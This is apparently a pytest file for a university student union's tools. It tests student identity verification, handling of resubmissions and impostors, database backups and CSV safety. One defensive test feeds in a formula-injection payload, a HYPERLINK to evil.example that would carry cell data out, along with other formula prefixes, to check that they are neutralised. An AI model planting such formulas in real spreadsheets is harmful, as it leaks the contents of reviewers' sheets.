"""Identity, adaptive verification (name only / student number only / both), levels, backups and CSV safety."""
import csv
import logging
import sqlite3
from pathlib import Path

import pytest

from test_agm import HEADERS as AGM_HEADERS, form_csv as agm_form, rsvp, students_db
from test_sap import AP_ROW, LC_ROW, form_csv as sap_form
from utsu_core import verification
from utsu_programs.agm import program as agm
from utsu_programs.sap import program as sap
from utsu_programs.senate import program as senate
from utsu_mail import campaign
from utsu_mail.recipients import read_csv
from utsu_std.csv_safe import SafeDictWriter, read_cell, safe_cell
from utsu_std.database import backup_database
from utsu_std.parsing_utils import get_trunc_id
from utsu_std.utils import absfile, application_uuid_for, identity_key, parse_id, student_uuid_for

SENATE_HEADERS = {"ts": "Timestamp", "user": "Username", "name": "Full ACORN-registered Name",
                  "id": "Student Number", "email": "UofT Email Address", "division": "Divisional Code",
                  "delegated": "Are you an delegated applicant?"}


def write_rows(path, header, rows):
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=header)
        writer.writeheader()
        writer.writerows(rows)
    return path


def senate_file(path, rows, with_name=True, with_id=True):
    """A Senate export; each row is (timestamp, name, student number, email)."""
    header = [h for k, h in SENATE_HEADERS.items()
              if not (k == "name" and not with_name) and not (k == "id" and not with_id)]
    out = []
    for ts, name, number, email in rows:
        row = {SENATE_HEADERS["ts"]: ts, SENATE_HEADERS["user"]: "p@gmail.com", SENATE_HEADERS["email"]: email,
               SENATE_HEADERS["division"]: "UC", SENATE_HEADERS["delegated"]: "No"}
        if with_name:
            row[SENATE_HEADERS["name"]] = name
        if with_id:
            row[SENATE_HEADERS["id"]] = number
        out.append(row)
    return write_rows(path, header, out)


def run_senate(path, conn, tmp_path):
    return senate.verify_senators(path, conn.cursor(), output_dir=tmp_path / "out")


# ---- matching -----------------------------------------------------------------------------------------------

def test_decide_always_needs_a_name_and_uses_what_else_is_given():
    decide = verification.decide
    ann = [("u1", 3161, "UC")]
    assert decide("Ann Lee", "1001231617", "", ann).level == 2
    assert decide("Ann Lee", "", "", ann).level == 1
    # a student number alone never identifies anyone: the roster only has its last four digits
    assert decide("", "1001231617", "", ann).reason == "no name given"
    assert not decide("", "1001231617", "UC", ann).verified
    # a wrong number never falls back to the name
    assert decide("Ann Lee", "1009999999", "", ann).reason == "student number does not match"
    assert decide("Ann Lee", "1009999999", "", []).reason == "name not found"
    assert decide("Sam Lee", "", "", [("u1", 1, "UC"), ("u2", 2, "UC")]).reason.startswith("name shared by 2")
    assert not decide("", "", "", []).verified


def test_the_level_is_the_number_of_factors_that_matched():
    decide = verification.decide
    ann = [("u1", 3161, "UC")]
    assert decide("Ann Lee", "", "", ann).level == 1
    # name < name + student number  OR  name + division < name + student number + division
    two = [decide("Ann Lee", "1001231617", "", ann), decide("Ann Lee", "", "UC", ann)]
    assert [m.level for m in two] == [2, 2]
    assert [m.method for m in two] == ["name + student number", "name + division"]
    three = decide("Ann Lee", "1001231617", "UC", ann)
    assert (three.level, three.method) == (3, "name + student number + division")


def test_a_division_must_match_and_never_identifies_anyone_alone():
    decide = verification.decide
    ann = [("u1", 3161, "UC")]
    assert decide("Ann Lee", "1001231617", "TRIN", ann).reason == "division does not match"
    assert decide("Ann Lee", "", "TRIN", ann).reason == "division does not match"
    assert decide("", "", "UC", []).reason == "no name given"
    # a student with no division on the roster never matches a division that was given
    assert decide("Ann Lee", "", "UC", [("u1", 3161, "")]).reason == "division does not match"
    # a division tells two students with the same name apart
    sams = [("u1", 1, "UC"), ("u2", 2, "TRIN")]
    assert decide("Sam Lee", "", "", sams).reason.startswith("name shared by 2")
    assert decide("Sam Lee", "", "TRIN", sams).uoft_uuid == "u2"
    assert decide("Sam Lee", "", "NEW", sams).reason == "division does not match"
    same = [("u1", 1, "UC"), ("u2", 2, "UC")]
    assert decide("Sam Lee", "", "UC", same).reason == "name shared by 2 students in that division; a student number is needed"


def test_two_students_with_the_same_name_and_last_four_digits_are_ambiguous_not_guessed():
    decide = verification.decide
    twins = [("u1", 3161, "UC"), ("u2", 3161, "UC")]
    assert decide("Sam Lee", "1001231617", "", twins).reason == \
        "name and student number shared by 2 students; a division is needed"
    # a division that tells them apart settles it; one that does not leaves it to a person
    apart = [("u1", 3161, "UC"), ("u2", 3161, "TRIN")]
    assert decide("Sam Lee", "1001231617", "TRIN", apart).uoft_uuid == "u2"
    assert decide("Sam Lee", "1001231617", "UC", twins).reason == \
        "name and student number shared by 2 students in that division; a person to decide is needed"


def test_match_students_reads_the_division_and_normalises_it():
    conn = students_db(("Ann", "Lee", 3161))
    people = [{"full_name": "Ann Lee", "division": "uc - University College"},
              {"full_name": "Ann Lee", "id": "1001231617", "division": " UC "},
              {"full_name": "Ann Lee", "division": "TRIN - Trinity College"}, {"full_name": "Ann Lee", "division": ""}]
    got = verification.match_students(people, conn.cursor())
    assert [(m.level, m.method) for m in got[:2]] == [(2, "name + division"), (3, "name + student number + division")]
    assert got[2].reason == "division does not match" and (got[3].level, got[3].method) == (1, "name only")


def test_match_students_needs_a_name_and_a_number_alone_matches_nobody():
    conn = students_db(("Ann", "Lee", 3161), ("Bo", "Chan", 9111), ("Di", "Park", 1111), ("Di", "Park", 2222))
    people = [{"full_name": "ann  LEE"}, {"id": "1009991111"}, {"full_name": "Di Park"},
              {"full_name": "Zed Zed", "id": "1000000000"}, {"id": "1000000000"}]
    got = verification.match_students(people, conn.cursor())
    assert [(m.uoft_uuid, m.level) for m in got] == [("u0", 1), (None, None), (None, None), (None, None), (None, None)]
    assert got[1].reason == "no name given" and got[2].reason.startswith("name shared")
    assert got[3].reason == "name not found" and got[4].reason == "no name given"


def test_a_database_error_is_raised_not_reported_as_not_found():
    empty = sqlite3.connect(":memory:")
    with pytest.raises(sqlite3.OperationalError):
        verification.match_students([{"full_name": "Ann Lee"}], empty.cursor())


def test_a_broken_lookup_table_is_an_error(tmp_path):
    empty = tmp_path / "map.csv"
    empty.write_text("Lookup Key, Replacement Key\n", encoding="utf-8")
    with pytest.raises(ValueError, match="no 'form column"):
        verification.construct_lookup_tables(empty)


def test_trunc_id_survives_whitespace_and_blanks():
    assert get_trunc_id(" 1006639715 ") == 3971
    assert get_trunc_id("") is None and get_trunc_id("12345") is None


# ---- forms that lack a name or a student number -------------------------------------------------------------

def test_senate_form_without_student_numbers_verifies_by_name(tmp_path):
    conn = students_db(("Ann", "Lee", 3161), ("Di", "Park", 1111), ("Di", "Park", 2222))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "", "ann@x.ca"),
                                            ("2026/10/01 9:05:00 a.m. AST", "Di Park", "", "di@x.ca")],
                       with_id=False)
    r = run_senate(form, conn, tmp_path)
    assert [a["full_name"] for a in r["verified"]] == ["Ann Lee"]
    # the form has the division too, which the roster confirms: name + division
    assert conn.execute("SELECT verification_level, match_method FROM senate_application "
                        "WHERE status = 'verified'").fetchall() == [(2, "name + division")]


def test_a_student_number_without_a_name_never_verifies(tmp_path):
    conn = students_db(("Ann", "Lee", 3161), ("Bo", "Chan", 9111))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "", "1001231617", "ann@x.ca"),
                                            ("2026/10/01 9:05:00 a.m. AST", "Bo Chan", "1009991111", "bo@x.ca")])
    r = run_senate(form, conn, tmp_path)
    assert [a["full_name"] for a in r["verified"]] == ["Bo Chan"]
    # the row with only a number is kept for a person to look at, never matched on the number
    assert [(a["id"], a["verification_level"]) for a in r["unverified"]] == [("1001231617", None)]


def test_a_form_without_a_name_column_is_refused(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "", "1001231617", "a@x.ca")],
                       with_name=False)
    with pytest.raises(ValueError, match="identify people"):
        run_senate(form, conn, tmp_path)


def test_sap_form_without_student_numbers_verifies_by_name(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = sap_form(tmp_path / "f.csv", [{**LC_ROW, "Student Number": ""}, AP_ROW])
    r = sap.process_sap(form, conn, output_dir=tmp_path / "out")
    assert [a["full_name"] for a in r["verified"]] == ["Ann Lee"]
    assert r["verified"][0]["verification_level"] == 1


def test_agm_form_without_name_columns_is_refused(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    header = [h for h in AGM_HEADERS if "ACORN-registered" not in h] + ["Student Number"]
    row = {"Timestamp": "2026/10/01 9:00:00 a.m. AST", "Username": "p@gmail.com", "Preferred Name": "",
           "Preferred Pronouns": "", "UofT Email Address": "ann@mail.utoronto.ca", "Meeting Preference": "Online",
           "Do you have any dietary restrictions or food allergies?": "", "Accessibility Requirements": "",
           "Data Processing Confirmation": "Yes", "Contact Consent": "Yes", "Student Number": "1001231617"}
    form = write_rows(tmp_path / "rsvp.csv", header, [row])
    with pytest.raises(ValueError, match="identify people"):
        agm.process_agm(form, conn, output_dir=tmp_path / "out")


# ---- internal ids come from the email ----------------------------------------------------------------------

def test_ids_are_built_from_the_email_and_fall_back_when_it_is_missing():
    assert identity_key(" Ann@X.ca ", "1", "Ann") == "ann@x.ca"
    assert identity_key("", " 100 ", "Ann") == "100" and identity_key("", "", "Ann  Lee") == "ann lee"
    # editing the number or the name does not change the ids while the email is the same
    assert student_uuid_for("a@x.ca", "1", "Ann") == student_uuid_for("A@x.ca", "2", "Anne")
    ts = "2026/10/01 9:00:00 a.m. AST"
    assert application_uuid_for("sap", ts, "a@x.ca", "1") == application_uuid_for("sap", ts, "a@x.ca", "2")
    assert application_uuid_for("sap", ts, "a@x.ca") != application_uuid_for("agm", ts, "a@x.ca")
    assert application_uuid_for("sap", ts, "a@x.ca") != application_uuid_for("sap", "2026/10/02 9:00:00 a.m. AST", "a@x.ca")


def test_ids_say_what_they_identify():
    ts = "2026/10/01 9:00:00 a.m. AST"
    assert student_uuid_for("a@x.ca").startswith("student:email:")
    assert student_uuid_for("", "1001231617").startswith("student:student_number:")
    assert student_uuid_for(full_name="Ann Lee").startswith("student:name:")
    assert application_uuid_for("sap", ts, "a@x.ca").startswith("application:sap:")
    # the same text as two kinds of id never gives the same uuid
    assert parse_id(student_uuid_for("a@x.ca"))[1] != parse_id(student_uuid_for(full_name="a@x.ca"))[1]
    assert parse_id(application_uuid_for("sap", ts, "a@x.ca")) == ("application:sap",
                                                                    application_uuid_for("sap", ts, "a@x.ca")[16:])
    assert parse_id("plain") == ("", "plain")


def test_a_corrected_submission_is_a_newer_one_and_the_old_row_goes(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    wrong = senate_file(tmp_path / "1.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1000000000", "ann@x.ca")])
    r1 = run_senate(wrong, conn, tmp_path)
    assert len(r1["unverified"]) == 1

    # Google Forms stamps an edit with a new timestamp, and the export no longer has the old row
    fixed = senate_file(tmp_path / "2.csv", [("2026/10/02 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")])
    r2 = run_senate(fixed, conn, tmp_path)
    assert r2["unverified"] == [] and r2["verified"][0]["verification_level"] == 3
    assert r2["alerts"] == []
    # the table holds exactly the export
    assert conn.execute("SELECT submission_ts, status FROM senate_application").fetchall() == \
        [("2026/10/02 9:00:00 a.m. AST", "verified")]


def test_a_verified_senate_application_is_never_downgraded_but_agm_follows_the_roster(tmp_path):
    ts = "2026/10/01 9:00:00 a.m. AST"
    conn = students_db(("Ann", "Lee", 3161))
    senate_form = senate_file(tmp_path / "s.csv", [(ts, "Ann Lee", "1001231617", "ann@x.ca")])
    agm_form_file = agm_form(tmp_path / "a.csv", [rsvp(ts, "Ann", "Lee", "ann@mail.utoronto.ca")])
    assert len(run_senate(senate_form, conn, tmp_path)["verified"]) == 1
    assert len(agm.process_agm(agm_form_file, conn, output_dir=tmp_path / "agm")["verified"]) == 1

    conn.execute("DELETE FROM uoft_data")  # the roster no longer has her
    conn.commit()
    senate_result = run_senate(senate_form, conn, tmp_path)
    assert len(senate_result["verified"]) == 1 and senate_result["unverified"] == []
    assert [a["kind"] for a in senate_result["alerts"]] == ["roster_mismatch"]
    agm_result = agm.process_agm(agm_form_file, conn, output_dir=tmp_path / "agm")
    assert agm_result["verified"] == [] and len(agm_result["unverified"]) == 1 and agm_result["alerts"] == []


def test_a_resubmission_with_the_same_email_replaces_the_older_one_even_if_the_number_changed(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1000000000", "ann@x.ca"),
                                            ("2026/10/02 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")])
    r = run_senate(form, conn, tmp_path)
    assert [a["verification_level"] for a in r["verified"]] == [3] and r["unverified"] == []
    assert sorted(s for (s,) in conn.execute("SELECT status FROM senate_application")) == ["superseded", "verified"]


# ---- an unverified submission is non-binding ---------------------------------------------------------------

def test_a_newer_unverified_submission_never_replaces_a_verified_one(tmp_path, caplog):
    conn = students_db(("Ann", "Lee", 3161))
    good = ("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")
    r1 = run_senate(senate_file(tmp_path / "1.csv", [good]), conn, tmp_path)
    assert len(r1["verified"]) == 1

    # someone submits with her email, a later time and wrong details
    imposter = ("2026/10/09 9:00:00 a.m. AST", "Ann Lee", "1000000000", "ann@x.ca")
    with caplog.at_level(logging.WARNING):
        r2 = run_senate(senate_file(tmp_path / "2.csv", [good, imposter]), conn, tmp_path)
    assert [a["uuid"] for a in r2["verified"]] == [r1["verified"][0]["uuid"]] and r2["unverified"] == []
    assert len(r2["non_binding"]) == 1 and "non-binding" in caplog.text
    assert sorted(s for (s,) in conn.execute("SELECT status FROM senate_application")) == ["non_binding", "verified"]

    # the whole export is checked every run, so it is still non-binding, and the verified application still binding
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        r3 = run_senate(senate_file(tmp_path / "3.csv", [good, imposter]), conn, tmp_path)
    assert len(r3["verified"]) == 1 and r3["unverified"] == [] and "non-binding" in caplog.text

    # a newer *verified* submission does replace it
    update = ("2026/10/12 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")
    r4 = run_senate(senate_file(tmp_path / "4.csv", [good, imposter, update]), conn, tmp_path)
    assert [a["submission_ts"] for a in r4["verified"]] == [update[0]]
    assert sorted(s for (s,) in conn.execute("SELECT status FROM senate_application")) == \
        ["superseded", "superseded", "verified"]


def test_with_nothing_verified_the_newest_unverified_submission_is_the_current_one(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1000000000", "ann@x.ca"),
                                            ("2026/10/02 9:00:00 a.m. AST", "Ann Lee", "1000000001", "ann@x.ca")])
    r = run_senate(form, conn, tmp_path)
    assert r["verified"] == [] and [a["submission_ts"] for a in r["unverified"]] == ["2026/10/02 9:00:00 a.m. AST"]


def test_sap_and_agm_unverified_resubmissions_are_non_binding_too(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    later = {**LC_ROW, "Timestamp": "2026/10/09 9:00:00 a.m. AST", "Student Number": "1000000000"}
    r = sap.process_sap(sap_form(tmp_path / "f.csv", [LC_ROW, later]), conn, output_dir=tmp_path / "out")
    assert [a["verification_level"] for a in r["verified"]] == [2] and r["unverified"] == []
    assert r["summary"]["non_binding"] == 1 and r["verified"][0]["batch"] == 1

    header = AGM_HEADERS + ["Student Number"]
    base = {"Timestamp": "2026/10/01 9:00:00 a.m. AST", "Username": "p@gmail.com", "Preferred Name": "",
            "Preferred Pronouns": "", "ACORN-registered First Name": "Ann", "ACORN-registered Last Name ": "Lee",
            "UofT Email Address": "ann@mail.utoronto.ca", "Meeting Preference": "Online",
            "Do you have any dietary restrictions or food allergies?": "", "Accessibility Requirements": "",
            "Data Processing Confirmation": "Yes", "Contact Consent": "Yes", "Student Number": ""}
    wrong = {**base, "Timestamp": "2026/10/09 9:00:00 a.m. AST", "Student Number": "1000000000"}
    a = agm.process_agm(write_rows(tmp_path / "a.csv", header, [base, wrong]), conn, output_dir=tmp_path / "out")
    assert [x["match_method"] for x in a["verified"]] == ["name only"] and a["unverified"] == []
    assert a["summary"]["non_binding"] == 1


def test_a_division_that_does_not_match_the_roster_is_unverified_and_asks_for_the_division(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")])
    # the roster has Ann in UC; the form (senate_file) says UC, so this verifies at level 3
    assert [a["verification_level"] for a in run_senate(form, conn, tmp_path)["verified"]] == [3]
    conn.execute("UPDATE uoft_data SET division = 'TRIN'")
    other = senate_file(tmp_path / "s2.csv", [("2026/10/02 9:00:00 a.m. AST", "Ann Lee", "1001231617", "bob@x.ca")])
    r = run_senate(other, conn, tmp_path / "other")
    assert r["verified"] == [] and len(r["unverified"]) == 1
    from utsu_mail.notices import DIVISION_FIELD, diagnose
    assert diagnose(r["unverified"][0], conn.cursor())[1] == [DIVISION_FIELD]


def test_a_student_with_no_college_belongs_to_their_faculty(tmp_path):
    # the Senate form's division codes are colleges and faculties: a student with no division is in their faculty
    conn = students_db(("Ann", "Lee", 3161))
    conn.execute("UPDATE uoft_data SET division = '', faculty = 'PHM'")
    ts = "2026/10/01 9:00:00 a.m. AST"
    ok = senate_file(tmp_path / "ok.csv", [(ts, "Ann Lee", "1001231617", "ann@x.ca")])
    text = ok.read_text(encoding="utf-8").replace(",UC,", ",PHM - Leslie Dan Faculty of Pharmacy,")
    ok.write_text(text, encoding="utf-8")
    r = run_senate(ok, conn, tmp_path / "a")
    assert [(a["verification_level"], a["match_method"]) for a in r["verified"]] == [
        (3, "name + student number + division")]
    # a student with a college is in the college, not in their faculty
    conn.execute("UPDATE uoft_data SET division = 'VIC', faculty = 'ARTSC'")
    assert run_senate(senate_file(tmp_path / "b.csv", [("2026/10/05 9:00:00 a.m. AST", "Ann Lee", "1001231617",
                                                        "ann2@x.ca")]), conn, tmp_path / "b")["verified"] == []


def test_a_division_alone_identifies_nobody(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "", "", "a@x.ca")])
    # the form has a division, but this row has neither a name nor a student number
    r = run_senate(form, conn, tmp_path)
    assert r["verified"] == []


# ---- backups -----------------------------------------------------------------------------------------------

def make_db(path):
    conn = sqlite3.connect(path)
    conn.execute("CREATE TABLE t (x)")
    conn.execute("INSERT INTO t VALUES (1)")
    conn.commit()
    conn.close()


def test_backup_is_a_timestamped_consistent_copy(tmp_path):
    db = tmp_path / "db.sqlite"
    assert backup_database(db) is None  # nothing to back up yet
    make_db(db)
    first = backup_database(db)
    second = backup_database(db)  # in the same second
    assert first.parent == tmp_path / "backups" and first != second
    assert first.name.startswith("db_") and first.suffix == ".sqlite"
    assert sqlite3.connect(first).execute("SELECT x FROM t").fetchall() == [(1,)]


def test_backups_can_be_pruned_to_the_newest(tmp_path):
    db = tmp_path / "db.sqlite"
    make_db(db)
    folder = tmp_path / "backups"
    folder.mkdir()
    for stamp in ("20260101-000000", "20260102-000000", "20260103-000000"):
        (folder / f"db_{stamp}.sqlite").write_bytes(b"old")
    (folder / "other_20260101-000000.sqlite").write_bytes(b"not ours")
    made = backup_database(db, keep=2)
    assert sorted(p.name for p in folder.glob("db_*")) == ["db_20260103-000000.sqlite", made.name]
    assert (folder / "other_20260101-000000.sqlite").exists()


# ---- spreadsheet safety ------------------------------------------------------------------------------------

def test_formula_cells_are_neutralised_and_plain_values_are_not():
    assert safe_cell('=HYPERLINK("http://x")').startswith("'=")
    assert all(safe_cell(v).startswith("'") for v in ("+cmd", "-cmd", "@SUM(1)", "\t=1", "\r=1"))
    assert [safe_cell(v) for v in ("Ann", "-3", "+1.5", 7, None, "")] == ["Ann", "-3", "+1.5", 7, None, ""]
    assert read_cell(safe_cell("=1+1")) == "=1+1" and read_cell("'Ann") == "'Ann"


def test_an_applicants_formula_never_reaches_a_reviewer_sheet_as_a_formula(tmp_path):
    conn = students_db(("Ann", "Lee", 3161))
    evil = '=HYPERLINK("https://evil.example/?"&A1,"click")'
    form = sap_form(tmp_path / "f.csv", [{**LC_ROW, "LC General Statement": evil}])
    out = tmp_path / "out"
    sap.process_sap(form, conn, output_dir=out)
    for sheet in (out / "sap_batches").glob("batch_*.csv"):
        for row in csv.DictReader(open(sheet, encoding="utf-8-sig")):
            assert not row["general_statement"].startswith(("=", "+", "-", "@"))
            assert row["general_statement"].startswith("'=")


def test_an_email_that_starts_with_a_plus_survives_the_round_trip(tmp_path):
    path = tmp_path / "r.csv"
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = SafeDictWriter(f, fieldnames=["email"])
        writer.writeheader()
        writer.writerow({"email": "+tag@x.ca"})
    assert "'+tag@x.ca" in path.read_text(encoding="utf-8")
    assert read_csv(path) == [{"email": "+tag@x.ca"}]

    log = tmp_path / "log.csv"
    campaign.append_log(log, "+tag@x.ca", "sent")
    assert campaign.already_sent(log) == {"+tag@x.ca"}


# ---- privacy -----------------------------------------------------------------------------------------------

def test_no_student_names_are_written_to_the_log(tmp_path, caplog):
    conn = students_db(("Ann", "Lee", 3161))
    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca"),
                                            ("2026/10/01 9:05:00 a.m. AST", "Zed Nobody", "1009999999", "z@x.ca")])
    with caplog.at_level(1):
        run_senate(form, conn, tmp_path)
        sap.process_sap(sap_form(tmp_path / "f.csv", [LC_ROW]), conn, output_dir=tmp_path / "out")
    text = caplog.text
    assert "Ann" not in text and "Nobody" not in text and "ann@" not in text and "1001231617" not in text
